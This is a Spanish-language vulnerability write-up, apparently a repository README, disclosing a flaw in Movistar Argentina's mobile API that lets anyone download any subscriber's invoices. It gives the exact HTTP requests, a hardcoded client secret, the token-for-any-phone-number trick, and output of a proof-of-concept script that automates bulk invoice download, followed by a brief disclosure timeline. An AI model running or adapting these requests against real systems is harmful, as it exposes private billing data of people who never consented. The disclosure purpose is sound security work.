# Facturas Movistar

Vulnerabilidad que permite descargar las facturas de cualquier numero de telefono de movistar. Fue encontrada utilizando [mitmproxy](https://mitmproxy.org/) en la aplicacion [móvil para Android](https://play.google.com/store/apps/details?id=com.services.movistar.ar&hl=es) de Movistar.

A continuacion se detallan los pasos necesarios:

## 1er paso: Obtener token oauth del usuario deseado

Se debe enviar un request a: `https://mi.movistar.com.ar` cambiando el campo `username` por el numero de telefono deseado.

    POST /oauth/token HTTP/1.1
    Host: mi.movistar.com.ar
    x-requested-with: com.services.movistar.ar
    content-type: application/x-www-form-urlencoded
    content-length: 91
     
    grant_type=mobile&username=1112345678&client_id=appcontainer&client_secret=YXBwY29udGFpbmVy
    
Se recibirá como respuesta un documento JSON con el `access_token` que nos permitira pedir las facturas del usuario. (Por motivos de seguridad y legibilidad el token fue truncado en el ejemplo)
    
    {
      "access_token": "eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE0NzE4NDcyODUsInVzZXJfbmFtZSI6Inp0MzFxWWRtQWdTNEN3PT0iLCJzY29wZSI...",
      "token_type": "bearer",
      "expires_in": ...,
      "scope": "read trust write",
      "jti": "..."
    }
    
## 2do paso: Obtener la lista de períodos disponibles

Cada período disponible se corresponde con una factura que podremos descargar. Se debe enviar un request a `https://mi.movistar.com.ar` utilizando el `access_token` que obtuvimos en el primer paso, colocandolo en el header `authorization`. (Por motivos de seguridad y legibilidad el token fue truncado en el ejemplo)

    GET /v1/facturacion/periodos HTTP/1.1
    Host: mi.movistar.com.ar
    authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE0NzE4NDk2NDQsInVzZXJfbmFtZSI6InJ3T3FjSGl6U05...
    content-type: application/x-www-form-urlencoded
 
Se recibirá como respuesta un documento JSON que contiene los períodos disponibles.
 
     {
      "status": 200,
      "date": "2016-08-21 ...",
      "data": [
        {
          ...
          "date": "2016-02-04",
          ...
        },
        {
          ...
          "date": "2016-03-04",
          ...
        },
        ...
      ]
    }
 
 De este documento, solo nos importan los campos `date` de cada período, ya que nos ayudaran a construir una URL para descargar la factura.
 
## 3er paso

Ya es posible descargar la factura y el comprobante, pero antes de hacerlo, es necesario conocer cuantas paginas es necesario descargar para tener el documento completo. Esta informacion la podemos obtener realizando otro request al mismo servidor.
Utilizaremos como ejemplo la factura emitida el `2016-03-04`.

    GET /v1/facturacion/resumen/2016-03-04/paginas HTTP/1.1
    Host: mi.movistar.com.ar
    authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE0NzE4NDk2NDQsInVzZXJfbmFtZSI6InJ3T3FjSGl6U05...
    content-type: application/x-www-form-urlencoded
 
Obtendremos como respuesta JSON un documento, en el cual estará indicado en el campo `data` la cantidad de paginas:
 
     {
      "status": 200,
      "date": "2016-08-21 ...",
      "data": 2
    }
    
Tambien podemos consultar la cantidad de paginas del comprobante:

    GET /v1/facturacion/comprobante/2016-03-04/paginas HTTP/1.1
    Host: mi.movistar.com.ar
    authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE0NzE4NDk2NDQsInVzZXJfbmFtZSI6InJ3T3FjSGl6U05...
    content-type: application/x-www-form-urlencoded
 
 Lo que devolverá:
 
     {
      "status": 200,
      "date": "2016-08-21 15:52:48",
      "data": 6
    }
    
## Paso 4: Descarga de los documentos

Armado ya con el token, los períodos disponibles, y la cantidad de páginas de cada documento, podemos proceder a descargarlos. 
Para ello, se bene enviar un request a la direccion:

    https://mi.movistar.com.ar/v1/facturacion/(resumen|comprobante)/<periodo>/jpeg/<pagina>
    
Por ejemplo, para descargar la primera pagina del comprobante usado en los pasos anteriores:

    GET /v1/facturacion/comprobante/2016-03-04/jpeg/0 HTTP/1.1
    Host: mi.movistar.com.ar
    authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE0NzE4NDk2NDQsInVzZXJfbmFtZSI6InJ3T3FjSGl6U05...
    content-type: application/x-www-form-urlencoded
 
 Obtenemos como headers de la respuesta:
 
    Server: Apache-Coyote/1.1
    Content-Type: image/jpeg
    ...
    
Y en el cuerpo, encontraremos una imagen JPEG correspondiente a la hoja 0 del comprobande del período solicitado.

# POC

En el archivo `bajar_facturas.py` se programo una aplicacion que automatiza lo explicado anteriormente, y descarga todas las facturas disponibles para un numero de telefono dado.

    Ingrese el numero de telefono: 1112345678
    Token: eyJhbGciOiJIUzI1NiJ9.eyJl...
    Encontradas facturas para fechas :['2016-02-04', '2016-03-04', ...]
    Requesting: https://mi.movistar.com.ar/v1/facturacion/resumen/2016-02-04/paginas
    Requesting: https://mi.movistar.com.ar/v1/facturacion/comprobante/2016-02-04/paginas
    Creating folder: .../Movistar_Exploit/1112345678/2016-02-04
    Requesting: https://mi.movistar.com.ar/v1/facturacion/resumen/2016-02-04/jpeg/0
    Saving image to: .../Movistar_Exploit/1112345678/2016-02-04/resumen0.jpg
    Requesting: https://mi.movistar.com.ar/v1/facturacion/comprobante/2016-02-04/jpeg/0
    Saving image to: .../Movistar_Exploit/1112345678/2016-02-04/comprobante0.jpg
    Requesting: https://mi.movistar.com.ar/v1/facturacion/comprobante/2016-02-04/jpeg/1
    Saving image to: .../Movistar_Exploit/1112345678/2016-02-04/comprobante1.jpg
    Requesting: https://mi.movistar.com.ar/v1/facturacion/comprobante/2016-02-04/jpeg/2
    Saving image to: .../Movistar_Exploit/1112345678/2016-02-04/comprobante2.jpg
    Requesting: https://mi.movistar.com.ar/v1/facturacion/comprobante/2016-02-04/jpeg/3
    Saving image to: .../Movistar_Exploit/1112345678/2016-02-04/comprobante3.jpg
    Requesting: https://mi.movistar.com.ar/v1/facturacion/comprobante/2016-02-04/jpeg/4
    Saving image to: .../Movistar_Exploit/1112345678/2016-02-04/comprobante4.jpg
    Requesting: https://mi.movistar.com.ar/v1/facturacion/comprobante/2016-02-04/jpeg/5
    Saving image to: .../Movistar_Exploit/1112345678/2016-02-04/comprobante5.jpg
    Requesting: https://mi.movistar.com.ar/v1/facturacion/resumen/2016-03-04/paginas
    Error al descargar la factura del periodo: 2016-03-04
    Requesting: https://mi.movistar.com.ar/v1/facturacion/resumen/2016-04-04/paginas
    Requesting: https://mi.movistar.com.ar/v1/facturacion/comprobante/2016-04-04/paginas
    Creating folder: .../Movistar_Exploit/1112345678/2016-04-04
    Requesting: https://mi.movistar.com.ar/v1/facturacion/resumen/2016-04-04/jpeg/0
    Saving image to: .../Movistar_Exploit/1112345678/2016-04-04/resumen0.jpg

# Timeline

- 21/08/2016: Primer contacto con Movistar Argentina via Twitter (@movistararg)
- 21/08/2016: Atención al cliente de Movistar informa que va a derivar el informe al area correspondiente.